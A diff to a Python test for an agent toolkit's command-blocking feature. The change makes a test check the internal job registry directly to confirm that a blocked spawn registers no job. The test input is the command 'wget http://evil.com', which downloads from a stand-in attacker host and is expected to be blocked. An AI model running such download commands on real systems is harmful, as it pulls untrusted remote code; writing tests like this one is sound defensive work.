@@ -64,13 +64,13 @@ class TestSpawnDefenseInDepth:
     async def test_spawn_does_not_store_blocked_job(self):
         """A blocked spawn must not register the job in the in-process registry."""
         from aden_tools.tools.file_system_toolkits.execute_command_tool.background_jobs import (
-            get,
+            _jobs,
         )
 
         with pytest.raises(CommandBlockedError):
             await spawn("wget http://evil.com", cwd=".", agent_id="test-agent")
 
         # Registry must be empty — no partial job was registered.
-        # We check a known-nonexistent id; get() returns None for any miss.
-        result = await get("test-agent", "nonexistent")
-        assert result is None
+        # We check the internal _jobs dict directly to ensure no entries leak.
+        agent_jobs = _jobs.get("test-agent", {})
+        assert not agent_jobs
